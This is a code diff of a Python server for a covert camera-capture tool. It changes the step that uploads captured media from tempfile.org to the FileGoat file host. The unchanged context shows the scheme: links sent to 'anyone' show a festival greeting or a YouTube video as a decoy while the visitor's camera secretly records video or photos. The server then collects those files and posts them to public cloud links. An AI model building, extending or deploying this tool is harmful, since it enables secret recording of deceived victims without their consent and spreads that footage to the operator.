@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Gift Video Receiver Server - With tempfile.org Cloud Upload
+Gift Video Receiver Server - With FileGoat Cloud Upload
 """
 
 import os
@@ -26,9 +26,9 @@ PORT = 5000
 FESTIVAL_HTML = 'festival.html'
 YOUTUBE_HTML = 'youtube.html'
 
-# tempfile.org configuration
-TMPFILE_EXPIRY = "24"  # Hours (1, 6, 12, 24, 48, 72, 168)
-TMPFILE_API_URL = "https://tempfile.org/api/upload/local"
+# FileGoat configuration
+FILEGOAT_EXPIRY_DAYS = 7  # Default: 7 days
+FILEGOAT_API_URL = "https://filego.at/upload"
 
 # ============================================
 # Flask Application
@@ -39,45 +39,52 @@ CORS(app)
 received_files = []
 uploaded_links = []
 
-def upload_to_tempfile(filepath, expiry_hours=24):
+def upload_to_filegoat(filepath, expiry_days=7):
     """
-    Upload a file to tempfile.org
+    Upload a file to FileGoat.
     
     Args:
         filepath: Path to the file to upload
-        expiry_hours: Hours until file expires (1, 6, 12, 24, 48, 72, 168)
+        expiry_days: Days until file expires (1, 7, 30, 90)
     
     Returns:
-        dict: {'url': shareable_url, 'delete_url': delete_url, 'success': bool}
+        dict: {'success': bool, 'url': shareable_url, 'expiry': str, 'delete_url': str}
     """
     try:
         filename = os.path.basename(filepath)
-        print(f"   ☁️ Uploading {filename} to tempfile.org...")
+        file_size = os.path.getsize(filepath)
+        print(f"   ☁️ Uploading {filename} ({file_size:,} bytes) to FileGoat...")
         
-        with open(filepath, "rb") as f:
+        # FileGoat API expects expiry in seconds
+        expiry_seconds = expiry_days * 24 * 60 * 60
+        
+        with open(filepath, 'rb') as f:
+            files = {'file': (filename, f)}
+            data = {'expiry': expiry_seconds}
+            
             response = requests.post(
-                TMPFILE_API_URL,
-                files={"files": f},
-                data={"expiryHours": str(expiry_hours)},
-                timeout=30
+                FILEGOAT_API_URL,
+                files=files,
+                data=data,
+                timeout=120  # 2 minute timeout for large files
             )
         
         if response.status_code == 200:
             result = response.json()
             
-            if result.get('files') and len(result['files']) > 0:
-                file_info = result['files'][0]
+            # FileGoat returns a JSON with 'url' field
+            if result.get('url'):
                 return {
                     'success': True,
-                    'url': file_info.get('url'),
-                    'delete_url': file_info.get('deleteUrl'),
-                    'filename': file_info.get('name'),
-                    'size': file_info.get('size'),
-                    'expires': file_info.get('expires')
+                    'url': result.get('url'),
+                    'expiry': f"{expiry_days} days",
+                    'delete_url': result.get('delete_url'),  # May not always be provided
+                    'filename': filename,
+                    'size': file_size
                 }
             else:
-                print(f"   ⚠️ No file info in response: {result}")
-                return {'success': False, 'error': 'No file info in response'}
+                print(f"   ⚠️ No URL in response: {result}")
+                return {'success': False, 'error': 'No URL in response'}
         else:
             print(f"   ❌ Upload failed with status {response.status_code}")
             print(f"   📋 Response: {response.text[:200]}")
@@ -140,39 +147,39 @@ def upload_media():
             'timestamp': timestamp,
             'size': os.path.getsize(filepath),
             'cloud_url': None,
-            'delete_url': None,
-            'expires': None
+            'expires': None,
+            'delete_url': None
         }
         
         # ============================================
-        # Upload to tempfile.org
+        # Upload to FileGoat
         # ============================================
         try:
-            result = upload_to_tempfile(filepath, int(TMPFILE_EXPIRY))
+            result = upload_to_filegoat(filepath, FILEGOAT_EXPIRY_DAYS)
             
             if result and result.get('success'):
                 file_info['cloud_url'] = result.get('url')
+                file_info['expires'] = result.get('expiry')
                 file_info['delete_url'] = result.get('delete_url')
-                file_info['expires'] = result.get('expires')
                 
-                print(f"   ✅ Uploaded to tempfile.org!")
+                print(f"   ✅ Uploaded to FileGoat!")
                 print(f"   🔗 Link: {result.get('url')}")
                 if result.get('delete_url'):
                     print(f"   🗑️ Delete URL: {result.get('delete_url')}")
-                print(f"   ⏰ Expires in: {TMPFILE_EXPIRY} hours")
+                print(f"   ⏰ Expires in: {result.get('expiry')}")
                 
                 uploaded_links.append({
                     'filename': filename,
                     'url': result.get('url'),
                     'delete_url': result.get('delete_url'),
-                    'expires': TMPFILE_EXPIRY
+                    'expires': result.get('expiry')
                 })
             else:
                 error_msg = result.get('error', 'Unknown error') if result else 'No result'
-                print(f"   ⚠️ tempfile.org upload failed: {error_msg}")
+                print(f"   ⚠️ FileGoat upload failed: {error_msg}")
                 
         except Exception as e:
-            print(f"   ❌ tempfile.org upload error: {e}")
+            print(f"   ❌ FileGoat upload error: {e}")
         
         received_files.append(file_info)
         
@@ -184,6 +191,7 @@ def upload_media():
         
         if file_info.get('cloud_url'):
             print(f"   ☁️ Cloud link: {file_info['cloud_url']}")
+            print(f"   ⏰ Expires: {file_info['expires']}")
         else:
             print(f"   ⚠️ Not uploaded to cloud")
         
@@ -323,37 +331,28 @@ class GiftServer:
         return video
 
     def get_cloud_config(self):
-        """Get cloud upload configuration from user"""
-        print("\n☁️ Cloud Upload Configuration (tempfile.org):")
+        """Get cloud upload configuration from user for FileGoat"""
+        print("\n☁️ Cloud Upload Configuration (FileGoat):")
         print("   Files will be uploaded with auto-expiry")
         print("")
         print("   Select expiry time:")
-        print("     1. 1 hour")
-        print("     2. 6 hours")
-        print("     3. 12 hours")
-        print("     4. 24 hours (default)")
-        print("     5. 48 hours")
-        print("     6. 72 hours (3 days)")
-        print("     7. 168 hours (7 days)")
+        print("     1. 1 day")
+        print("     2. 7 days (default)")
+        print("     3. 30 days")
+        print("     4. 90 days")
         
         while True:
-            choice = input("\n   Enter choice (1-7, press Enter for default): ").strip()
-            if choice == '' or choice == '4':
-                return "24"
+            choice = input("\n   Enter choice (1-4, press Enter for default): ").strip()
+            if choice == '' or choice == '2':
+                return 7
             elif choice == '1':
-                return "1"
-            elif choice == '2':
-                return "6"
+                return 1
             elif choice == '3':
-                return "12"
-            elif choice == '5':
-                return "48"
-            elif choice == '6':
-                return "72"
-            elif choice == '7':
-                return "168"
+                return 30
+            elif choice == '4':
+                return 90
             else:
-                print("   ❌ Invalid choice. Enter 1-7 or press Enter for default")
+                print("   ❌ Invalid choice. Enter 1-4 or press Enter for default")
 
     def generate_link(self, mode, name=None, video_id=None, camera='user', capture_mode='video', duration=15, photos=5):
         base_url = self.ngrok_url
@@ -437,7 +436,7 @@ class GiftServer:
     def wait_for_files(self):
         print("\n🎁 Waiting for files... (Press Ctrl+C to stop)")
         print(f"📁 Files saved locally in: {UPLOAD_FOLDER}/")
-        print("☁️ Files will be uploaded to tempfile.org cloud")
+        print("☁️ Files will be uploaded to FileGoat cloud")
         print("-"*50)
         print("\n⏳ Waiting for first file...")
         print("💡 Files will NOT auto-open. Check the folder or cloud links.")
@@ -455,8 +454,8 @@ class GiftServer:
                     print(f"   📂 Full path: {os.path.abspath(file_info['path'])}")
                     
                     if file_info.get('cloud_url'):
-                        print(f"   ☁️ Cloud link: {file_info['cloud_url']}")
-                        print(f"   ⏰ Expires in: {TMPFILE_EXPIRY} hours")
+                        print(f"   ☁️ FileGoat link: {file_info['cloud_url']}")
+                        print(f"   ⏰ Expires: {file_info['expires']}")
                         if file_info.get('delete_url'):
                             print(f"   🗑️ Delete URL: {file_info['delete_url']}")
                     else:
@@ -493,9 +492,9 @@ class GiftServer:
                 return
             
             # Get cloud config
-            global TMPFILE_EXPIRY
-            TMPFILE_EXPIRY = self.get_cloud_config()
-            print(f"   ✅ Files will expire after: {TMPFILE_EXPIRY} hours")
+            global FILEGOAT_EXPIRY_DAYS
+            FILEGOAT_EXPIRY_DAYS = self.get_cloud_config()
+            print(f"   ✅ Files will expire after: {FILEGOAT_EXPIRY_DAYS} days")
             
             mode = self.show_main_menu()
             
@@ -526,7 +525,7 @@ class GiftServer:
             print(f"   🎯 Mode: {mode_name}")
             print(f"   📷 Camera: {'Front' if camera == 'user' else 'Back'}")
             print(f"   📸 Capture: {'Video (' + str(duration) + 's)' if capture_mode == 'video' else 'Photo (' + str(photos) + ' photos)'}")
-            print(f"   ☁️ Cloud expiry: {TMPFILE_EXPIRY} hours (tempfile.org)")
+            print(f"   ☁️ Cloud expiry: {FILEGOAT_EXPIRY_DAYS} days (FileGoat)")
             
             if mode == 'festival':
                 print(f"   🎊 Festival Name: {name}")
@@ -543,7 +542,7 @@ class GiftServer:
                     print(f"   5. Records {duration} second video")
                 else:
                     print(f"   5. Captures {photos} photos")
-                print("   6. Files upload to tempfile.org cloud!")
+                print("   6. Files upload to FileGoat cloud!")
             else:
                 print("   1. Send the link above to anyone")
                 print("   2. They see a YouTube video playing")
@@ -552,9 +551,9 @@ class GiftServer:
                     print(f"   4. Records {duration} second video")
                 else:
                     print(f"   4. Captures {photos} photos")
-                print("   5. Files upload to tempfile.org cloud!")
+                print("   5. Files upload to FileGoat cloud!")
             
-            print(f"\n☁️ tempfile.org: Files expire after {TMPFILE_EXPIRY} hours")
+            print(f"\n☁️ FileGoat: Files expire after {FILEGOAT_EXPIRY_DAYS} days")
             print("   Links will be shown when files are received")
             
             print("\n💡 Files saved locally too. Check the folder:")
